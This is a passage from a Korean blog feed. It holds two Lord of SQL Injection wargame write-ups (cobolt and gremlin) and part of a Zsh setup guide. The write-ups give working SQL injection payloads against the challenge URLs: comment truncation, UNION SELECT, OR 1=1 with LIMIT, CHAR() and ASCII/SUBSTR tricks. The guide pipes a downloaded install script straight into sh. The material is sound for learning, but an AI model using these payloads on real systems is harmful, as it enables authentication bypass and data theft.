부분을 찾을 수 있다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> tbl <span class="keyword">LIMIT</span> <span class="number">5</span>,<span class="number">10</span>;  <span class="comment"># Retrieve rows 6-15</span></span><br></pre></td></tr></table></figure><p>즉, <code>SELECT</code> 절의 마지막에 <code>LIMIT 1,2</code> 를 붙이면 테이블에서 조건에 맞는 행 중 첫 번째(Index 0) 행부터가 아닌 <strong>두 번째</strong>(Index 1) 행부터 <strong>두 개의</strong> 행만 가져오게 된다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>cobolt 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_cobolt where id='&#123;$_GET[id]&#125;' and pw=md5('&#123;$_GET[pw]&#125;')"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"cobolt"</span>);</span><br><span class="line">  <span class="keyword">elseif</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result['id']&#125;&lt;br&gt;You are not admin :(&lt;/h2&gt;"</span>;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1~6번 줄은 1번 문제와 동일하다.</p><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_cobolt where id='&#123;$_GET[id]&#125;' and pw=md5('&#123;$_GET[pw]&#125;')"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"cobolt"</span>);</span><br><span class="line"><span class="keyword">elseif</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result['id']&#125;&lt;br&gt;You are not admin :(&lt;/h2&gt;"</span>;</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>와 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>1번 문제와 거의 동일하며, 문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>admin</code> 문자열 직접 삽입</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=admin&apos;-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_cobolt <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">-- -' and pw=md5('')</span></span><br></pre></td></tr></table></figure><p>이는 결국 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p><code>UNION</code> 구문 이용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=&apos; union select &apos;admin&apos;-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_cobolt <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">'admin'</span><span class="comment">-- -' and pw=md5('')</span></span><br></pre></td></tr></table></figure><p>이는 결국 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p><code>LIMIT</code> 구문 이용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=&apos; or 1=1-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_cobolt <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">-- -' and pw=md5('')</span></span><br></pre></td></tr></table></figure><p>이는 테이블의 모든 행을 불러오도록 조작하는 SQL Injection이다. 이를 수행하면 다음과 같은 문자열이 응답에 포함된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello rubiya</span><br><span class="line">You are not admin :(</span><br></pre></td></tr></table></figure><p>이 문자열로 미루어 보아 테이블에 <code>admin</code>이라는 <code>id</code>를 가진 행이 있을 것임을 추측할 수 있다.</p><p>또한 현재는 테이블의 <code>rubiya</code>라는 <code>id</code>를 가진 첫 번째 행이 들어가지만 <code>$result[&#39;id&#39;]</code>에 들어가는 행을 하나씩 당겨보는 것을 <code>id</code>가 <code>admin</code>인 행에 도달할 때까지 반복하면 문제가 풀릴 것임을 추측할 수 있다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=&apos; or 1=1 limit 1,1-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_cobolt <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span><span class="comment">-- -' and pw=md5('')</span></span><br></pre></td></tr></table></figure><p>위 SQL Injection은 prob_cobolt 테이블의 2번째 행의 <code>id</code>가 <code>admin</code>이기 때문에 결국 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p><code>CHAR()</code> 함수 및 ASCII 코드 활용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=&apos; or id=char(97, 100, 109, 105, 110)-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_cobolt <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="built_in">char</span>(<span class="number">97</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">110</span>)<span class="comment">-- -' and pw=md5('')</span></span><br></pre></td></tr></table></figure><p>이는 ASCII에서 10진수 표기를 문자 표기로 바꿔주는 MySQL 함수인 <code>CHAR</code>를 이용하여 <code>id</code>가 <code>admin</code>인 행을 찾아 선택하도록 만든다.</p><p>ASCII에서, <code>&#39;a&#39;</code>=<code>97</code>, <code>&#39;d&#39;</code>=<code>100</code>, <code>&#39;m&#39;</code>=<code>109</code>, <code>&#39;i&#39;</code>=<code>105</code>, <code>&#39;n&#39;</code>=<code>110</code>이다.</p><p>따라서 이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p>ASCII(), SUBSTR() 함수 및 ASCII 코드 활용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=&apos; or ascii(substr(id, 1, 1))=97-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_cobolt <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">id</span>, <span class="number">1</span>, <span class="number">1</span>))=<span class="number">97</span><span class="comment">-- -' and pw=md5('')</span></span><br></pre></td></tr></table></figure><p>이는 ASCII에서 문자 표기자 10진수 표기로 바꿔주는 MySQL 함수인 <code>ASCII</code>를 이용하여 <code>id</code>가 <code>a</code>로 시작하는 행을 찾아 선택하도록 만든다.</p><p>이번에는 운이 좋아 <code>a</code>로 시작하는 첫번째 행이 <code>admin</code>이었지만, 만약 안되면 1번째 글자가 <code>a</code>, 2번째 글자가 <code>d</code>, 3번째 글자가 <code>m</code>, 4번째 글자가 <code>i</code>, 5번째 글자가 <code>n</code>인 행을 찾도록 조작하면 된다.</p><p>ASCII에서, <code>&#39;a&#39;</code>=<code>97</code>이다.</p><p>따라서 이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 2번 cobolt 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.1 Gremlin</title>
    <link href="https://www.jslee.me/2019/08/12/los-write-up-01-gremlin/"/>
    <id>https://www.jslee.me/2019/08/12/los-write-up-01-gremlin/</id>
    <published>2019-08-12T02:24:33.000Z</published>
    <updated>2019-08-20T11:08:10.031Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 1번 gremlin 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>기본적인 SQL Injection을 통해 SQL문을 조작할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="include"><a href="#include" class="headerlink" title="include"></a>include</h4><ul><li>php의 include에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.include.php" target="_blank" rel="noopener">PHP: include - Manual</a></li></ul><h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int preg_match ( string $pattern , string $subject [, <span class="keyword">array</span> &amp;$matches [, int $flags [, int $offset ]]] )</span><br></pre></td></tr></table></figure><ul><li>preg_match 함수는 문자열에서 정규표현식 매치를 수행한다.</li><li>반환값은 매치된 횟수이며, 0 또는 1 이다. 이는 처음 매치 후 검색을 중지하기 때문이다.</li><li>php의 preg_match 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.<ul><li><a href="http://php.net/manual/kr/function.preg-match.php" target="_blank" rel="noopener">PHP: preg_match - Manual</a></li></ul></li></ul><h4 id="정규-표현식-Regular-Expression"><a href="#정규-표현식-Regular-Expression" class="headerlink" title="정규 표현식 (Regular Expression)"></a>정규 표현식 (Regular Expression)</h4><ul><li>정규 표현식은 특정한 규칙을 가진 문자열의 집합을 표현하는 데 사용하는 형식 언어이다.</li><li>정규 표현식에 대해 잘 모르겠다면 다음 링크를 참고하자.<ul><li><a href="https://ko.wikipedia.org/wiki/%EC%A0%95%EA%B7%9C_%ED%91%9C%ED%98%84%EC%8B%9D" target="_blank" rel="noopener">정규 표현식 - 위키백과</a></li><li><a href="http://regexr.com/" target="_blank" rel="noopener">정규 표현식 테스트 사이트 RegExr</a></li></ul></li></ul><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>gremlin 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_gremlin where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"gremlin"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">login_chk();</span><br><span class="line">dbconnect();</span><br></pre></td></tr></table></figure><ul><li><code>config.php</code> 파일을 불러와 적용시킨다. <code>config.php</code> 내부에 <code>login_chk()</code>, <code>dbconnect()</code>, <code>solve()</code> 등 문제 풀이 환경과 관련된 함수가 선언되어 있을 것으로 추정할 수 있다.</li><li><code>login_chk()</code> 함수는 로그인 된 상태인지 확인하는 기능을 할 것으로 추정할 수 있다.</li><li><code>dbconnect()</code> 함수는 데이터베이스에 연결하는 기능을 할 것으로 추정할 수 있다.</li></ul><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>id</code>와 <code>pw</code>를 받으며, <code>id</code>나 <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.<ul><li><code>preg_match(&#39;/prob|_|\.|\(\)/i&#39;, $_GET[id])</code> 는 <code>$_GET[id]</code>에서 정규표현식 <code>&#39;/prob|_|\.|\(\)/i&#39;</code> 을 매치한다.</li><li>즉, <code>if(preg_match(&#39;/prob|_|\.|\(\)/i&#39;, $_GET[id])) exit(&quot;No Hack ~_~&quot;);</code> 이 문장을 통해 <code>$_GET[id]</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 중 하나라도 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li></ul></li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_gremlin where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"gremlin"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>와 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 참이 되는 어떤 문자열이든 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>WHERE 조건절 무력화<br>GET 방식으로 정보를 전송하기 위해 다음과 같이 URL의 맨 끝에 쿼리 스트링을 붙인다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=&apos; or 1=1 -- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_gremlin <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">-- -' and pw=''</span></span><br></pre></td></tr></table></figure><p>이는 WHERE 조건절을 항상 참으로 만들어 <code>prob_gremlin</code> 테이블의 모든 행의 <code>id</code> 열을 불러오도록 하므로 문제가 풀린다.</p></li><li><p>UNION 구문 이용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=&apos; union select &apos;a&apos;-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_gremlin <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">'a'</span><span class="comment">-- -' and pw=''</span></span><br></pre></td></tr></table></figure><p>이는 결국 <code>$result[&#39;id&#39;]</code>에 <code>&#39;a&#39;</code>가 들어가도록 하므로 문제가 풀린다.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 1번 gremlin 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu에 Zsh 구성하기</title>
    <link href="https://www.jslee.me/2019/08/11/install-zsh-on-ubuntu/"/>
    <id>https://www.jslee.me/2019/08/11/install-zsh-on-ubuntu/</id>
    <published>2019-08-10T16:35:41.000Z</published>
    <updated>2019-08-10T16:53:10.468Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/2019/08/11/install-zsh-on-ubuntu/terminal.svg" width="200"><p>개발 일을 하는 사람에게 뗄래야 뗄 수 없는 것이 바로 터미널 소프트웨어이다.<br>이왕 계속 보는 거 좀 이쁘면 기분이 좋지 않을까?</p><p>나와 같은 생각을 했던 많은 개발자들이 탄탄대로를 만들어 놓았다.<br>이 문서에서는 Ubuntu 환경에 Zsh를 설치하고 구성하는 방법을 정리한다.</p><a id="more"></a><h2 id="Zsh-설치"><a href="#Zsh-설치" class="headerlink" title="Zsh 설치"></a>Zsh 설치</h2><p>다음 명령어를 이용하여 설치할 수 있다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zsh</span><br></pre></td></tr></table></figure><p>다음 명령어를 이용하여 zsh를 현재 계정의 기본 쉘로 변경할 수 있다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /usr/bin/zsh</span><br></pre></td></tr></table></figure><h2 id="oh-my-zsh-구성"><a href="#oh-my-zsh-구성" class="headerlink" title="oh-my-zsh 구성"></a>oh-my-zsh 구성</h2><h3 id="oh-my-zsh-설치"><a href="#oh-my-zsh-설치" class="headerlink" title="oh-my-zsh 설치"></a>oh-my-zsh 설치</h3><p>다음 명령어를 이용하여 설치할 수 있다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure><h3 id="테마-변경"><a href="#테마-변경" class="headerlink" title="테마 변경"></a>테마 변경</h3><p>다음과 같이 <code>~/.zshrc</code> 파일을 수정하여 <code>agnoster</code> 테마를 사용하도록 설정한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">THEME=<span class="string">"agnoster"</span></span><br></pre></td></tr></table></figure><p>다음 명령어를 이용하여 변경사항을 반영한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure><p>폰트가 깨질 경우 Powerline을 지원하는 폰트를 설치한다.</p><p>필자는 D2Coding 폰트를 설치하였다.</p><p>폰트 설치 방법은 추후 별도의 포스트로 정리하도록 하겠다.</p><h3 id="Agnoster-테마-컴퓨터-이름-숨기기-설정"><a href="#Agnoster-테마-컴퓨터-이름-숨기기-설정" class="headerlink" title="Agnoster 테마 컴퓨터 이름 숨기기 설정"></a>Agnoster 테마 컴퓨터 이름 숨기기 설정</h3><p>Agnoster 테마는 기본적으로 매번 입력을 받을 때마다 계정 이름과 컴퓨터 이름을 표시한다.</p><p>이 때문에 조금만 긴 명령어를 입력하고자 하면 쉽게 라인을 넘어가는 경우가 생긴다.</p><p>조금 불편하기 때문에 컴퓨터 이름을 표시하지 않게 설정하여 이런 경우를 줄일 수 있다.</p><p>다음 구문을 <code>~/.zshrc</code> 파일에 추가한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">prompt_context</span></span>() &#123;</span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">"<span class="variable">$USER</span>"</span> != <span class="string">"<span class="variable">$DEFAULT_USER</span>"</span> || -n <span class="string">"<span class="variable">$SSH_CLIENT</span>"</span> ]]; <span class="keyword">then</span></span><br><span class="line">    prompt_segment black default <span class="string">"%(!.%&#123;%F&#123;yellow&#125;%&#125;.)<span class="variable">$USER</span>"</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="New-Line-설정"><a href="#New-Line-설정" class="headerlink" title="New Line 설정"></a>New Line 설정</h3><p>Agnoster 테마는 입력 라인에 표시하는 정보가 많아 조금만 긴 명령어를 입력하면 쉽게 라인을 넘어간다.</p><p>입력을 다음 라인부터 받게 하여 이러한 경우를 줄일 수 있다.</p><p><code>~/.oh-my-zsh/themes/agnoster.zsh-theme</code> 파일을 다음과 같이 수정한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### Main prompt</span></span><br><span class="line"><span class="function"><span class="title">build_prompt</span></span>() &#123;</span><br><span class="line">  RETVAL=$?</span><br><span class="line">  prompt_status</span><br><span class="line">  prompt_virtualenv</span><br><span class="line">  prompt_aws</span><br><span class="line">  prompt_context</span><br><span class="line">  prompt_dir</span><br><span class="line">  prompt_git</span><br><span class="line">  prompt_bzr</span><br><span class="line">  prompt_hg</span><br><span class="line">  prompt_newline</span><br><span class="line">  prompt_end</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">prompt_newline</span></span>() 